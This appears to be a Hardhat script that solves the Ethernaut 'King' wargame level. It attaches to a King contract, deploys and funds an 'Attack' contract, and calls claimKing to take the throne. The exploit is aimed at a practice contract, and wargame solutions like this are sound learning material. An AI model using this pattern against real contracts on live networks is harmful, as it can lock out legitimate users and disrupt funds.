import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {    
    const [account] = await ethers.getSigners();

    const King = await ethers.getContractFactory("King");
    const king = King.attach("0xE00B7E1317d9EA638E6fCda50eAE18F1774f52D4");

    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(king.address, {
        value: ethers.utils.parseEther("0.0015")
    });

    let tx = await attack.claimKing({
        gasLimit: 10000000
    });
    await tx.wait();

    console.log(await king.prize());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });